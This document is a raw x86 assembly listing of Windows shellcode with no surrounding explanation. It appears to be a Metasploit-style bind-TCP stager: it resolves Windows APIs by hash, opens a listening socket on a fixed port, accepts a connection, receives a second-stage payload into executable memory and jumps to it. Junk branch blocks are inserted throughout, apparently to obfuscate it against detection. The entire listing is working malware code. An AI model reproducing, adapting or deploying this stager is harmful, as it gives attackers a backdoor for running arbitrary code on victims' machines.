```asm
_start:
    cld
    call L_95
RET_6:
    pushal
    xor edx, edx
    mov ebp, esp
    mov edx, dword ptr fs:[edx + 0x30]
    mov edx, dword ptr [edx + 0xc]
    mov edx, dword ptr [edx + 0x14]
L_15:
    xor edi, edi
    mov esi, dword ptr [edx + 0x28]
    movzx ecx, word ptr [edx + 0x26]
L_1e:
    xor eax, eax
    lodsb al, byte ptr [esi]
    cmp al, 0x61
    jl L_27
    sub al, 0x20
L_27:
    ror edi, 0xd
    add edi, eax
    dec ecx
    jne L_1e
    pushfd
    push eax
    xor eax, eax
    jnz bogus_1
    jmp real_1
bogus_1:
    nop
    mov eax, eax
real_1:
    pop eax
    popfd
    push edx
    mov edx, dword ptr [edx + 0x10]
    mov eax, dword ptr [edx + 0x3c]
    add eax, edx
    mov eax, dword ptr [eax + 0x78]
    push edi
    pushfd
    push eax
    xor eax, eax
    jnz bogus_2
    jmp real_2
bogus_2:
    nop
    mov eax, eax
real_2:
    pop eax
    popfd
    test eax, eax
    je L_8c
    add eax, edx
    mov ecx, dword ptr [eax + 0x18]
    push eax
    mov ebx, dword ptr [eax + 0x20]
    add ebx, edx
L_4b:
    test ecx, ecx
    je L_8b
    xor edi, edi
    dec ecx
    mov esi, dword ptr [ebx + ecx*4]
    add esi, edx
L_57:
    xor eax, eax
    lodsb al, byte ptr [esi]
    ror edi, 0xd
    add edi, eax
    cmp al, ah
    jne L_57
    add edi, dword ptr [ebp - 8]
    cmp edi, dword ptr [ebp + 0x24]
    jne L_4b
    pushfd
    push eax
    xor eax, eax
    jnz bogus_3
    jmp real_3
bogus_3:
    nop
    mov eax, eax
real_3:
    pop eax
    popfd
    pop eax
    mov ebx, dword ptr [eax + 0x24]
    add ebx, edx
    mov cx, word ptr [ebx + ecx*2]
    mov ebx, dword ptr [eax + 0x1c]
    add ebx, edx
    mov eax, dword ptr [ebx + ecx*4]
    add eax, edx
    mov dword ptr [esp + 0x24], eax
    pop ebx
    pop ebx
    popal
    pop ecx
    pop edx
    push ecx
    jmp eax
L_8b:
    pop eax
L_8c:
    pop edi
    pop edx
    mov edx, dword ptr [edx]
    jmp L_15
L_95:
    pop ebp
    push 0x3233
    push 0x5f327377
    push esp
    push 0x726774c
    call ebp
    mov eax, 0x190
    sub esp, eax
    push esp
    push eax
    push 0x6b8029
    call ebp
    push 0xb
    pop ecx
L_bb:
    push eax
    loop L_bb
    pushfd
    push eax
    xor eax, eax
    jnz bogus_4
    jmp real_4
bogus_4:
    nop
    mov eax, eax
real_4:
    pop eax
    popfd
    push 1
    push 2
    push 0xe0df0fea
    call ebp
    xchg edi, eax
    push 0xd2040002
    mov esi, esp
    push 0x10
    push esi
    push edi
    push 0x6737dbc2
    call ebp
    test eax, eax
    jne L_15d
    push edi
    push 0xff38e9b7
    call ebp
    push edi
    push 0xe13bec74
    call ebp
    push edi
    xchg edi, eax
    push 0x614d6e75
    call ebp
    push 0
    push 0x10
    call L_116
    add al, 0xde
    cli
    inc ecx
    .byte 0x62, 0xc6, 0x0b, 0xc1, 0x91, 0xde, 0x90, 0xdf, 0xf9, 0xd5, 0x32, 0x36, 0x57, 0x68, 0xc2, 0xeb
L_116:
    .byte 0x38, 0x5f, 0xff, 0xd5, 0x6a, 0x00, 0x6a, 0x04, 0x56, 0x57, 0x68, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x83, 0xf8, 0x00, 0x7e, 0x2d, 0x8b, 0x36, 0x6a, 0x40, 0x68, 0x00, 0x10, 0x00, 0x00, 0x56, 0x6a, 0x00, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0x53, 0x6a, 0x00, 0x56, 0x53, 0x57, 0x68, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x83, 0xf8, 0x00, 0x7e, 0x07, 0x01, 0xc3, 0x29, 0xc6, 0x75, 0xe9, 0xc3, 0xbb, 0xf0, 0xb5, 0xa2
L_15d:
    .byte 0x56, 0x6a, 0x00, 0x53, 0xff, 0xd5
```